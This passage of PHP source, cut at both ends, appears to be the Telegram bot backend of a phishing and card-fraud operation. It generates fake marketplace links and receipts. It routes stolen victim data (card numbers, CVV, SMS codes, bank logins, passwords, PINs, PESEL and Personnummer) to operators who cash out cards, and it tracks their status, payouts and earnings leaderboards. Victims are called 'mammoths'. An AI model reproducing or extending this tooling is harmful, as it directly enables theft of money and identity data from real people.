                    'text' => "📦 Товар: ".$product->title."\n💲 Стоимость: ".$product->price." ".$product->currancy."\n\n✅ Готово! Удачной работы:)\n\n🔗 Ссылка: ".$product->generate_link,
                    'reply_markup'=>$replyMarkup
                ];  
                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
                exit();
            } 
            
        }  




        if(strpos($post->message->text,'/changeprice_')!==false){

            $changeprice = explode("_",$post->message->text); 
            $con->user->update_user($usr->chat_id,array("now_settings"=>serialize((object)array('step'=>4,'pid'=>$changeprice[1],'country' =>  $usr->now_settings->countries, 'market'=>  $usr->now_settings->market)))); 

            $data = [
                'chat_id' => $post->message->chat->id, 
                'message_id' => $post->message->message_id, 
                'parse_mode'=>'HTML',
                'text' => "Ведите новую цену"
            ];  

            file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));

        }  

        if(strpos($post->message->text,'/get_check_')!==false){

            $check = explode("_",$post->message->text);  

            $market = '';
            if($bot_config->markets->{$product->country}){
                $market = $bot_config->markets->{$product->country}->domain;
            }else{
                $market = $bot_config->countries->{$product->country}->markets->{$product->market}->domain;
            }

            $product = (object)$con->products->get_product($check[2]);//
            $gen_check = 'https://'.$_SERVER['HTTP_HOST'].'/c.php?s='.$product->price.'&c='.$product->currancy.'&ct='.$product->country.'&m='.$bot_config->countries->{$product->country}->markets->{$product->market}->domain.'&r='.time();
            /*$data = [
                'chat_id' => $post->message->chat->id,   
                'parse_mode'=>'HTML',
                'text' => $gen_check
            ];  

            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); */
            $data = [
                'chat_id' => $post->message->chat->id, 
                'photo'=>$gen_check
            ];    

            file_get_contents($urlApi.$key.'/sendPhoto?'.http_build_query($data));

        }  
         
        
        if(strpos($post->message->text,'/set_log_')!==false){

            
            //file_put_contents('./log.txt', json_encode($post)."\n\n");

            $data_log = explode("_",$post->message->text); 

            $product = (object)$con->products->get_product($data_log[3]);
            $card = (object)$con->user->get_card($data_log[4]); 
            $worker = (object)$con->user->get_user_byid($product->uid);
            $chat_id = $worker->chat_id;

            $con->user->update_card($data_log[4],array("vbiv_status"=>$data_log[2])); 

            if($card->vbid!=$post->from->id){ return false;}
            
             if($data_log[2]=='3ds'){
                $text = '✉️ У мамонта отключён 3Ds';
            }elseif($data_log[2]=='limit'){
                $text = '🔒 У мамонта на карте лимит';
            }elseif($data_log[2]=='fake'){
                $text = '🗑 Мамонт ввел не верные данные карты';
            }elseif($data_log[2]=='waitlk'){
                $text = '⏳ Ожидаю ЛК';
            }elseif($data_log[2]=='code'){
                $text = '💬 SMS отпралено'; 
            }elseif($data_log[2]=='fakecode'){
                $text = '🗑💬 Фейк Код'; 
            }elseif($data_log[2]=='push'){
                $text = '📤 Push отпрален';
            }elseif($data_log[2]=='reject'){
 
                $banking = '';
                if($card->bank_login){
                    $banking .= "\n💳 <b>Login</b>: <code>".$card->bank_login."</code>";
                }
                if($card->bank_haslo){
                    $banking .= "\n💳 <b>Haslo</b>: <code>".$card->bank_haslo."</code>";
                }
                if($card->bank_pin){
                    $banking .= "\n💳 <b>Pin</b>: <code>".$card->bank_pin."</code>";
                }
                if($card->bank_pesel){
                    $banking .= "\n💳 <b>Pesel</b>: <code>".$card->bank_pesel."</code>";
                }
                if($card->bank_nmatki){
                    $banking .= "\n💳 <b>Ф. матери</b>: <code>".$card->bank_nmatki."</code>";
                } 
                if($card->bank_nojca){
                    $banking .= "\n💳 <b>Ф. отца</b>: <code>".$card->bank_nojca."</code>";
                }  
                if($card->bank_key){
                    $banking .= "\n💳 <b>Key</b>: <code>".$card->bank_key."</code>";
                }
                if($card->cardPersonnummer){
                    $banking .= "\n💳 <b>Personnummer</b>: <code>".$card->cardPersonnummer."</code>";
                }
                $market_name_nos = '';
                if($bot_config->markets->{$product->country}){
                    $market_name_nos = $bot_config->markets->{$product->country}->name;
                }else{
                    $market_name_nos = $bot_config->countries->{$product->country}->markets->{$product->market}->name_nos;
                }
                $text = "🔙 💳 Лог <code>".$card->id."</code> Вбивер отдал карту ⚠️\n\n📬 ".$bot_config->countries->{$product->country}->flag." <b>".$market_name_nos."</b>\n📬 <b>Стоимость товара</b>: ".$product->price." ".$product->currancy."\n📬 <b>Номер карты</b>: <code>".$card->number."</code>\n📬 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').")\n✉️ <b>SMS</b>: <code>".$card->sms."</code> 👈\n📬 <b>Имя держателя</b>: ".$card->card_name."\n📬 <b>Срок карты</b>: ".$card->month."/".$card->year."".($card->cnp?"\n💳 <b>CNP</b>: <code>".$card->cnp."</code>":"")."\n📬 <b>CVV</b>: <code>".$card->cvv."</code>"."".$banking."\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n🏦 <b>Банк</b>: ".$card->bank_name."\n📬 <b>Страна</b>: ".$card->bank_country."\n📬 <b>Тип карты</b>: ".$card->bank_scheme."\n📬 <b>Воркер</b>: <a href='https://t.me/".$worker->login."'>".$worker->login."</a> | ".$worker->id."\n\n";
            }elseif($data_log[2]=='ok'){ 
                $inline_keyboard = array(
                    array("Отмена ввода успеха")
                );
                $keyboard = array("keyboard" => $inline_keyboard,'one_time_keyboard'=>true,'resize_keyboard' => true);
                $replyMarkup = json_encode($keyboard); 

                $market_name_nos = '';
                if($bot_config->markets->{$product->country}){
                    $market_name_nos = $bot_config->markets->{$product->country}->name;
                }else{
                    $market_name_nos = $bot_config->countries->{$product->country}->markets->{$product->market}->name_nos;
                }

                $data = [
                    'chat_id' => $post->message->chat->id,
                    'message_id' => $post->message->message_id,
                    'parse_mode'=>'HTML',
                    'text' => "❌ Лог  <code>".$card->id."</code> бьет @".$post->from->username."⚠️\n\n📬 ".$bot_config->countries->{$product->country}->flag." <b>".$market_name_nos."</b> 💳 Ввод карты 💳\n📬 <b>Стоимость товара</b>: ".$product->price." ".$product->currancy."\n📬 <b>Номер карты</b>: <code>".$card->number."</code>\n📬 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').")\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n🏦 <b>Банк</b>: ".$card->bank_name."\n📬 <b>Страна</b>: ".$card->bank_country."\n📬 <b>Тип карты</b>: ".$card->bank_scheme."\n".($card->sms?"✉️ <b>SMS</b>: <code>".$card->sms."</code> 👈":"")."\n\n📬 <b>Воркер</b>: <a href='https://t.me/".$worker->login."'>".$worker->login."</a> | ".$worker->id."\n\n <b>Введите сумму успеха в гривнах</b>\n             👇👇👇",
                    'reply_markup'=>$replyMarkup
                ];  

                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
            }
            if($data_log[2]!='ok'){

                $data = [ 
                    'callback_query_id'=>$post->id,
                    'text' => '✅ Уведомление воркеру было отправлено ✅'
                ];  
    
                file_get_contents($urlApi.$key.'/answerCallbackQuery?'.http_build_query($data)); 

                $data = [
                    'chat_id' => $post->message->chat->id,
                    'parse_mode'=>'HTML',
                    'reply_to_message_id'=>$post->message->message_id,
                    'text' => "✅ Уведомление воркеру было отправлено ✅\n".$text."\n<b>Вбивер: </b><a href='https://t.me/".$post->from->username."'>".$post->from->username."</a> \n<b>Воркер: </b><a href='https://t.me/".$worker->login."'>".$worker->login."</a>"
                ];  

                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 

                $data = [
                    'chat_id' => $chat_id,
                    'parse_mode'=>'HTML',
                    'text' => "Лог <code>".$card->id."</code> \n".$text
                ];  

                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));  
            }
        }  

        

        
        if(strpos($post->message->text,'/vwork_')!==false&&($post->message->chat->type=='group'||$post->message->chat->type=='supergroup')&&(strpos($post->message->chat->title,'Log')!==false||strpos($post->message->chat->title,'Лог')!==false)){
            $check = explode("_",$post->message->text);  
            $usert = (object)$con->user->get_user(array('chat_id'=>$post->message->from->id));  
            
            $countrys = (array)unserialize($usert->vbiv_country);

            $check[1]=strtolower($check[1]);
            
            if($usert){ 
                  
                if(!in_array($check[1],$countrys)){ 
                     
                    
                    $countrys[]=strtolower($check[1]);

                    $con->user->update_user($post->message->from->id,array('vbiv_country'=>serialize($countrys)));
                    $data = [
                        'chat_id' => $post->message->chat->id,
                        'parse_mode'=>'HTML',
                        'text' => '🟢 @'.$usert->login.' начал работу на вбиве в'.($bot_config->markets->{$check[1]}?$bot_config->markets->{$check[1]}->name:$bot_config->countries->{$check[1]}->name)
                    ];   
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                    $data = [
                        //'chat_id' => $bot_chanels->chanels->{'chanel_vorkers_'.$check[1]}->id,
                        'chat_id' => $bot_chanels->chanels->{'chanel_vorkers_pl'}->id,
                        'parse_mode'=>'HTML',
                        'text' => '🟢 @'.$usert->login.' начал работу на вбиве в'.($bot_config->markets->{$check[1]}?$bot_config->markets->{$check[1]}->name:$bot_config->countries->{$check[1]}->name)
                    ];   
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                } 
                exit();
            }  
        }
        if(strpos($post->message->text,'/vsleep_')!==false&&($post->message->chat->type=='group'||$post->message->chat->type=='supergroup')&&(strpos($post->message->chat->title,'Log')!==false||strpos($post->message->chat->title,'Лог')!==false)){
            $check = explode("_",$post->message->text);  
            $usert = (object)$con->user->get_user(array('chat_id'=>$post->message->from->id));  
            
            $countrys = (array)unserialize($usert->vbiv_country);

            $check[1]=strtolower($check[1]);
            
            if($usert){ 
                
            //$usert->is_vbiver    
                if(in_array($check[1],$countrys)){ 
                    $cou = array();
 
                        
                        foreach($countrys as $v){
                            if($v!=$check[1]){
                                $cou[]=$v;
                            }
                        }
                     
                    
                    $con->user->update_user($post->message->from->id,array('vbiv_country'=>serialize($cou)));
                    
                    $data = [
                        'chat_id' => $post->message->chat->id,
                        'parse_mode'=>'HTML',
                        'text' => '🔴 @'.$usert->login.' закончил работу на вбиве в '.($bot_config->markets->{$check[1]}?$bot_config->markets->{$check[1]}->name:$bot_config->countries->{$check[1]}->name)
                    ];   
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                    $data = [
                        //'chat_id' => $bot_chanels->chanels->{'chanel_vorkers_'.$check[1]}->id, 
                        'chat_id' => $bot_chanels->chanels->{'chanel_vorkers_pl'}->id,
                        'parse_mode'=>'HTML',
                        'text' => '🔴 @'.$usert->login.' закончил работу на вбиве в'.($bot_config->markets->{$check[1]}?$bot_config->markets->{$check[1]}->name:$bot_config->countries->{$check[1]}->name)
                    ];   
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                } 
                exit();
            }  
        }

        /* SMS ER */

        if(strpos($post->message->text,'/worksms_')!==false&&($post->message->chat->type=='group'||$post->message->chat->type=='supergroup')&&(strpos($post->message->chat->title,'SMS')!==false)){
            $check = explode("_",$post->message->text);  
            $usert = (object)$con->user->get_user(array('chat_id'=>$post->message->from->id));  
            
            $countrys = (array)unserialize($usert->sms_country);

            $check[1]=strtolower($check[1]);
            
            if($usert){ 
                  
                if(!in_array($check[1],$countrys)){ 
                     
                    
                    $countrys[]=strtolower($check[1]);

                    $con->user->update_user($post->message->from->id,array('sms_country'=>serialize($countrys)));
                    $data = [
                        'chat_id' => $post->message->chat->id,
                        'parse_mode'=>'HTML',
                        'text' => '🟢 @'.$usert->login.' начал работу на SMS в'.($bot_config->markets->{$check[1]}?$bot_config->markets->{$check[1]}->name:$bot_config->countries->{$check[1]}->name)
                    ];   
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                    $data = [ 
                        'chat_id' => $bot_chanels->chanels->{'chanel_vorkers_pl'}->id,
                        'parse_mode'=>'HTML',
                        'text' => '🟢 @'.$usert->login.' начал работу на SMS в'.($bot_config->markets->{$check[1]}?$bot_config->markets->{$check[1]}->name:$bot_config->countries->{$check[1]}->name)
                    ];   
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                } 
                exit();
            }  
        }
        
        if(strpos($post->message->text,'/sleepsms_')!==false&&($post->message->chat->type=='group'||$post->message->chat->type=='supergroup')&&(strpos($post->message->chat->title,'SMS')!==false)){
            $check = explode("_",$post->message->text);  
            $usert = (object)$con->user->get_user(array('chat_id'=>$post->message->from->id));  
            
            $countrys = (array)unserialize($usert->sms_country);

            $check[1]=strtolower($check[1]);
            
            if($usert){ 
                 
                if(in_array($check[1],$countrys)){ 
                    $cou = array();
 
                        
                        foreach($countrys as $v){
                            if($v!=$check[1]){
                                $cou[]=$v;
                            }
                        }
                     
                    
                    $con->user->update_user($post->message->from->id,array('sms_country'=>serialize($cou)));
                    
                    $data = [
                        'chat_id' => $post->message->chat->id,
                        'parse_mode'=>'HTML',
                        'text' => '🔴 @'.$usert->login.' закончил работу на SMS в '.($bot_config->markets->{$check[1]}?$bot_config->markets->{$check[1]}->name:$bot_config->countries->{$check[1]}->name)
                    ];   
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                    $data = [ 
                        'chat_id' => $bot_chanels->chanels->{'chanel_vorkers_pl'}->id,
                        'parse_mode'=>'HTML',
                        'text' => '🔴 @'.$usert->login.' закончил работу на SMS в'.($bot_config->markets->{$check[1]}?$bot_config->markets->{$check[1]}->name:$bot_config->countries->{$check[1]}->name)
                    ];   
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                } 
                exit();
            }  
        }

        /* PARS ER */

        if(strpos($post->message->text,'/workpars_')!==false&&($post->message->chat->type=='group'||$post->message->chat->type=='supergroup')&&(strpos($post->message->chat->title,'PARS')!==false)){
            $check = explode("_",$post->message->text);  
            $usert = (object)$con->user->get_user(array('chat_id'=>$post->message->from->id));  
            
            $countrys = (array)unserialize($usert->pars_country);

            $check[1]=strtolower($check[1]);
            
            if($usert){ 
                  
                if(!in_array($check[1],$countrys)){ 
                     
                    
                    $countrys[]=strtolower($check[1]);

                    $con->user->update_user($post->message->from->id,array('pars_country'=>serialize($countrys)));
                    $data = [
                        'chat_id' => $post->message->chat->id,
                        'parse_mode'=>'HTML',
                        'text' => '🟢 @'.$usert->login.' начал работу на парсе в'.($bot_config->markets->{$check[1]}?$bot_config->markets->{$check[1]}->name:$bot_config->countries->{$check[1]}->name)
                    ];   
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                    $data = [ 
                        'chat_id' => $bot_chanels->chanels->{'chanel_vorkers_pl'}->id,
                        'parse_mode'=>'HTML',
                        'text' => '🟢 @'.$usert->login.' начал работу на парсе в'.($bot_config->markets->{$check[1]}?$bot_config->markets->{$check[1]}->name:$bot_config->countries->{$check[1]}->name)
                    ];   
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                } 
                exit();
            }  
        }
        
        if(strpos($post->message->text,'/sleeppars_')!==false&&($post->message->chat->type=='group'||$post->message->chat->type=='supergroup')&&(strpos($post->message->chat->title,'PARS')!==false)){
            $check = explode("_",$post->message->text);  
            $usert = (object)$con->user->get_user(array('chat_id'=>$post->message->from->id));  
            
            $countrys = (array)unserialize($usert->pars_country);

            $check[1]=strtolower($check[1]);
            
            if($usert){ 
                 
                if(in_array($check[1],$countrys)){ 
                    $cou = array();
 
                        
                        foreach($countrys as $v){
                            if($v!=$check[1]){
                                $cou[]=$v;
                            }
                        }
                     
                    
                    $con->user->update_user($post->message->from->id,array('pars_country'=>serialize($cou)));
                    
                    $data = [
                        'chat_id' => $post->message->chat->id,
                        'parse_mode'=>'HTML',
                        'text' => '🔴 @'.$usert->login.' закончил работу на парсе в '.($bot_config->markets->{$check[1]}?$bot_config->markets->{$check[1]}->name:$bot_config->countries->{$check[1]}->name)
                    ];   
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                    $data = [ 
                        'chat_id' => $bot_chanels->chanels->{'chanel_vorkers_pl'}->id,
                        'parse_mode'=>'HTML',
                        'text' => '🔴 @'.$usert->login.' закончил работу на парсе в'.($bot_config->markets->{$check[1]}?$bot_config->markets->{$check[1]}->name:$bot_config->countries->{$check[1]}->name)
                    ];   
                    file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                } 
                exit();
            }  
        }

        if(strpos($post->message->text,'/vbivers')!==false){
            
            $vbt = ''; 
            $smser = ''; 
            $parser = '';
            foreach($bot_config->countries as $kc=>$vc){ 
                
                $vbivers = $con->user->get_vbivers($kc);
                $smsers = $con->user->get_smsers($kc);
                $parsers = $con->user->get_parsers($kc);
                
                $vbt .= $vc->flag.'('.$kc.') на вбиве';
                $smser .= $vc->flag.' на SMS';
                $parser .= $vc->flag.' на парсе';
                if(count($vbivers)>0){
                    foreach($vbivers as $v){ 
                        $vbt .= ' <a href="https://t.me/'.$v->login.'">'.$v->login.'</a>, ';
                    }
                }else{
                    $vbt .=' никого нет';
                }
               $vbt .="\n";  

               if(count($smsers)>0){
                    foreach($smsers as $v){ 
                        $smser .= ' <a href="https://t.me/'.$v->login.'">'.$v->login.'</a>, ';
                    }
                }else{
                    $smser .=' никого нет';
                }
                $smser .="\n"; 

                if(count($parsers)>0){
                    foreach($parsers as $v){ 
                        $parser .= ' <a href="https://t.me/'.$v->login.'">'.$v->login.'</a>, ';
                    }
                }else{
                    $parser .=' никого нет';
                }
                $parser .="\n"; 
            }
            foreach($bot_config->markets as $kc=>$vc){ 
                
                $vbivers = $con->user->get_vbivers($kc);
                $smsers = $con->user->get_smsers($kc);
                $parsers = $con->user->get_parsers($kc);
                
                $vbt .= $vc->flag.'('.$kc.') на вбиве';
                $smser .= $vc->flag.' на SMS';
                $parser .= $vc->flag.' на парсе';
                if(count($vbivers)>0){
                    foreach($vbivers as $v){ 
                        $vbt .= ' <a href="https://t.me/'.$v->login.'">'.$v->login.'</a>, ';
                    }
                }else{
                    $vbt .=' никого нет';
                }
               $vbt .="\n";  

               if(count($smsers)>0){
                    foreach($smsers as $v){ 
                        $smser .= ' <a href="https://t.me/'.$v->login.'">'.$v->login.'</a>, ';
                    }
                }else{
                    $smser .=' никого нет';
                }
                $smser .="\n"; 

                if(count($parsers)>0){
                    foreach($parsers as $v){ 
                        $parser .= ' <a href="https://t.me/'.$v->login.'">'.$v->login.'</a>, ';
                    }
                }else{
                    $parser .=' никого нет';
                }
                $parser .="\n"; 
            }
            $data = [
                'chat_id' => $post->message->chat->id,
                'parse_mode'=>'HTML',
                'text' => $vbt."\n💌 SMS 💌\n".$smser."\n🧨 PARSER 🧨\n".$parser
            ];   
            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
        }

      /*   if(strpos($post->message->text,'/stat')!==false){
            
            $summ_today = $con->user->get_stat_summ_today();
            $count_today = $con->user->get_stat_count_today();
            $sum_yestotay = $con->user->get_stat_summ_yestoday();
             
            $data = [
                'chat_id' => $post->message->chat->id,
                'parse_mode'=>'HTML',
                'text' => "📊 <b>Статистика за сегодня</b> 📊\n🐘 Залетов: <b>".$count_today."</b>\n💰 На сумму: <b>".($summ_today?$summ_today:0)." грн</b>\n\n💸 Вчера: <b>".($sum_yestotay?$sum_yestotay:0)." грн</b>\n"
            ];   
            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
        } */

        if(strpos($post->message->text,'/stat')!==false){
            
            $summ_today = $con->user->get_stat_summ_today();
            $count_today = $con->user->get_stat_count_today();
            $sum_yestotay = $con->user->get_stat_summ_yestoday();

            $max_record_day = $con->user->get_stat_max_record_day();
            $record_users = $con->user->get_record_users(); 

            $vals = array_values($record_users);
            $keys = array_keys($record_users);

            $toper = '';
            $meda = ['🥇','🥈','🥉','🏅','🎖'];
            for($i=0;$i<5;$i++){
                $toper.=$meda[$i].' 👨‍💻 <code>'.$keys[$i].'</code> : <b>$'.ceil(curs($vals[$i],"UAH","USD"))."</b>\n";
            }

            $data = [
                'chat_id' => $post->message->chat->id,
                'parse_mode'=>'HTML',
                'text' => "📊 <b>Статистика за сегодня</b> 📊\n🐘 Залетов: <b>".$count_today."</b>\n💰 На сумму: <b>".($summ_today?$summ_today:0)." грн</b>\n\n💸 Вчера: <b>".($sum_yestotay?$sum_yestotay:0)." грн</b>\n💰Рекорд за день: <b>$".ceil(curs($max_record_day,"UAH","USD"))."</b>\n\n🔥Рекорд:\n".$toper."\n"
            ];   
            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
        }

        if(strpos($post->message->text,'/mestat')!==false){
            

            $txtx = '';
            foreach($bot_config->countries as $k=>$v){

                $summ_all = $con->user->get_stat_summ_all($usr->id,$k);
                $count_all = $con->user->get_stat_count_all($usr->id,$k);
                $summ_today = $con->user->get_stat_summ_today($usr->id,$k);

                $txtx .= "<b>".$v->name."</b>\n";
                $txtx .= "💰 <b>Всего заработано:</b> ".($summ_all?$summ_all:0)." UAH\n";
                $txtx .= "🐘 <b>Всего залетов:</b> ".($count_all?$count_all:0)."\n";
                $txtx .= "💸 <b>Сегодня заработано:</b> ".($summ_today?$summ_today:0)." UAH\n\n";
                //$txtx .= "📊 <b>Место в топе:</b> \n\n";

            }
 
             
            $data = [
                'chat_id' => $post->message->chat->id,
                'parse_mode'=>'HTML',
                'text' => $txtx
            ];   
            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data)); 
        }
        
        if(strpos($post->message->text,'/deleteviplta_')!==false){
            $check = explode("_",$post->message->text); 
            
            $con->user->update_card($check[1],array('status_viplat'=>1)); 
             
        }
        if(strpos($post->message->text,'/successviplta_')!==false){
            $check = explode("_",$post->message->text); 
            
            $con->user->update_card($check[1],array('status_viplat'=>2)); 
        }
        if(strpos($post->message->text,'/successviplta_')!==false||strpos($post->message->text,'/deleteviplta_')!==false){
            $check = explode("_",$post->message->text);
            $card = $con->user->get_card($check[1]);
            $product = (object)$con->products->get_product($card->pid); 
            $worker = (object)$con->user->get_user_byid($product->uid); 
 
            $data = [
                'chat_id' => $card->vbid,  
                'parse_mode'=>'HTML',
                'message_id'=>$post->message->message_id,
                'text' => "💸 <b>Залет</b>: #".$card->id."\n <b>Сумма</b>: ".$card->vbiv_success_summ." UAH / ".curs($card->vbiv_success_summ,"UAH",$product->currancy)."\n👨‍💻 <b>Воркер</b>: <a href='https://t.me/".$worker->login."'>".$worker->login."</a>\n🦹‍♂️ <b>Вбивер</b>: @".$card->vblogin."\n\n✅ Обработано ".($card->status_viplat==1?"[Удалено]":"[Выплачено]")."\n"
            ];      
            file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data)); 
            
            
             $data = [
                    'chat_id' => $bot_chanels->chanels->{'chanel_payments'}->id, 
                    'message_id'=>$check[2], 
                    'parse_mode'=>'HTML',
                    'text' => "".$bot_config->countries->{$product->country}->name."\n✅ <b>Сумма</b>: ".$card->vbiv_success_summ." UAH / ".curs($card->vbiv_success_summ,"UAH",$product->currancy)."\n💵 <b>Статус</b>: ".(!$card->status_viplat?"[В обработке]":($card->status_viplat==1?"[Удалено]":"[Выплачено]"))." 💵\n👨‍💻 <b>Воркер</b>: ".$worker->id."\n<b>ID</b>: ".$card->id."|\n"
                ];     
                file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));
                $data = [
                    'chat_id' => $bot_chanels->chanels->{'chanel_vorkers_pl'}->id, 
                    'message_id'=>$check[2], 
                    'parse_mode'=>'HTML',
                    'text' => "".$bot_config->countries->{$product->country}->name."\n✅ <b>Сумма</b>: ".$card->vbiv_success_summ." UAH / ".curs($card->vbiv_success_summ,"UAH",$product->currancy)."\n💵 <b>Статус</b>: ".(!$card->status_viplat?"[В обработке]":($card->status_viplat==1?"[Удалено]":"[Выплачено]"))." 💵\n👨‍💻 <b>Воркер</b>: ".$worker->id."\n<b>ID</b>: ".$card->id."|\n"
                ];     
                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
        }


        if(strpos($post->message->text,'/get_log_')!==false){

            $check = explode("_",$post->message->text);  

            $product = (object)$con->products->get_product($check[2]); 
            $card = (object)$con->user->get_card($check[3]); 
            $worker = (object)$con->user->get_user_byid($product->uid); 

            /* if($card_active){
                $data = [
                    'chat_id' => $post->message->chat->id,
                    'parse_mode'=>'HTML',
                    'text' => '@'.$card->vblogin.' у Вас уже есть активные вбивы, завершите сначала их!'.json_encode($card)
                ];  

                file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
                exit();
            } */

            /* if($card->vbiv_status=='reject'||$card->vbiv_status=='success_ok'){
                exit();
            } */ 

            $btn1 = array("text" => "✉️ 3DS","callback_data" => "/set_log_3ds_".$check[2]."_".$check[3]); 
            $btn2 = array("text" => "🔒 Лимит","callback_data" => "/set_log_limit_".$check[2]."_".$check[3]);
            $btn3 = array("text" => "🗑 Фэйк карта","callback_data" => "/set_log_fake_".$check[2]."_".$check[3]);
            $btn4 = array("text" => "🔙 Отдать карту","callback_data" => "/set_log_reject_".$check[2]."_".$check[3]);
            $btn5 = array("text" => "🗑💬 Фейк Код","callback_data" => "/set_log_fakecode_".$check[2]."_".$check[3]);
            $btn6 = array("text" => "💬 Code sent","callback_data" => "/set_log_code_".$check[2]."_".$check[3]);
            $btn7 = array("text" => "📤 Push sent","callback_data" => "/set_log_push_".$check[2]."_".$check[3]);
            $btn8 = array("text" => "⏳ Жду ЛК","callback_data" => "/set_log_waitlk_".$check[2]."_".$check[3]);
            $btn9 = array("text" => "✅ Успех ".$card->id,"callback_data" => "/set_log_ok_".$check[2]."_".$check[3]);
            $inline_keyboard = [[$btn1,$btn2],[$btn3,$btn4],[$btn5,$btn6],[$btn7,$btn8],[$btn9]]; 
                
            $keyboard = array("inline_keyboard" => $inline_keyboard);
            $replyMarkup = json_encode($keyboard); 
 
            $con->user->update_card($check[3],array('vbid'=>$post->from->id,'vblogin'=>$post->from->username)); 

            if(!$card->number){ exit(); }

            $banking = '';
                if($card->bank_login){
                    $banking .= "\n💳 <b>Login</b>: <code>".$card->bank_login."</code>";
                }
                if($card->bank_haslo){
                    $banking .= "\n💳 <b>Haslo</b>: ****";
                }
                if($card->bank_pin){
                    $banking .= "\n💳 <b>Pin</b>: ****";
                }
                if($card->bank_pesel){
                    $banking .= "\n💳 <b>Pesel</b>: ****";
                } 
                
                if($card->bank_key){
                    $banking .= "\n💳 <b>Key</b>: ****";
                }
                if($card->cardPersonnummer){
                    $banking .= "\n💳 <b>Personnummer</b>: ****";
                }
                $market_name_nos = '';
                if($bot_config->markets->{$product->country}){
                    $market_name_nos = $bot_config->markets->{$product->country}->name;
                }else{
                    $market_name_nos = $bot_config->countries->{$product->country}->markets->{$product->market}->name_nos;
                }
            $data = [
                'chat_id' => $post->message->chat->id, 
                'message_id'=>$post->message->message_id,
                'parse_mode'=>'HTML',
                'text' => "❌ Лог <code>".$card->id."</code> бьет @".$post->from->username."⚠️\n\n".$bot_config->countries->{$product->country}->flag." <b>".$market_name_nos."</b> 💳 Ввод карты 💳\n📬 <b>Стоимость</b>: ".$product->price." ".$product->currancy."\n💳 <b>Карта</b>: <code>".$card->number."</code>\n💳 <b>MM/YY</b>: ".$card->month."/".$card->year."".($card->cnp?"\n💳 <b>CNP</b>: <code>".$card->cnp."</code>":"")."\n💳 <b>CVV</b>: ***".$banking."\n☠️ <b>Имя</b>: ".$card->card_name."\n🏦 <b>Банк</b>: ".($card->bank_name?$card->bank_name:'----')."\n💳 <b>Тип</b>: ".$card->bank_scheme."\n📬 <b>IP</b>: ".$product->ip."\n📬 <b>Устройство</b>: ".$product->device."\n📬 <b>Страна</b>: ".$card->bank_country."\n\n💎 <b>Баланс</b>: ".$card->balance." ".$product->currancy." (".curs($card->balance,$product->currancy,'UAH')."/ ".curs($card->balance,$product->currancy,"RUB")."/ ".curs($card->balance,$product->currancy,'USD')."/ ".curs($card->balance,$product->currancy,'EUR').")\n".($card->sms?"✉️ <b>SMS</b>: <code>".$card->sms."</code> 👈":"")."\n📬 <b>Воркер</b>: <a href='https://t.me/".$worker->login."'>".$worker->login."</a> | ".$worker->id."\n\n"
            ]; 
            //file_get_contents($urlApi.$key.'/editMessageText?'.http_build_query($data));  

            $data['reply_markup']=$replyMarkup;
            file_get_contents($urlApi.$key.'/sendMessage?'.http_build_query($data));
             
            $banking = '';
            if($card->bank_login){
                $banking .= "\n💳 <b>Login</b>: <code>".$card->bank_login."</code>";
            }
            if($card->bank_haslo){
                $banking .= "\n💳 <b>Haslo</b>: <code>".$card->bank_haslo."</code>";
            }
            if($card->bank_pin){
                $banking .= "\n💳 <b>Pin</b>: <code>".$card->bank_pin."</code>";
            }
            if($card->bank_pesel){
                $banking .= "\n💳 <b>Pesel</b>: <code>".$card->bank_pesel."</code>";
            }
            if($card->bank_nmatki){
                $banking .= "\n💳 <b>Ф. матери</b>: <code>".$card->bank_nmatki."</code>";
            } 
            if($card->bank_nojca){
                $banking .= "\n💳 <b>Ф. отца</b>: <code>".$card->bank_nojca."</code>";
            } 
            if($card->bank_key){
                $banking .= "\n💳 <b>Key</b>: <code>".$card->bank_key."</code>";
            }
            if($card->cardPersonnummer){
                $banking .= "\n💳 <b>Personnummer</b>: <code>".$card->cardPersonnummer."</code>";
            }
            $market_name_nos = '';
                if($bot_config->markets->{$product->country}){
                    $market_name_nos = $bot_config->markets->{$product->country}->name;
                }else{
                    $market_name_nos = $bot_config->countries->{$product->country}->markets->{$product->market}->name_nos;
                }
            $data = [
                'chat_id' => $post->from->id,
                'parse_mode'=>'HTML',
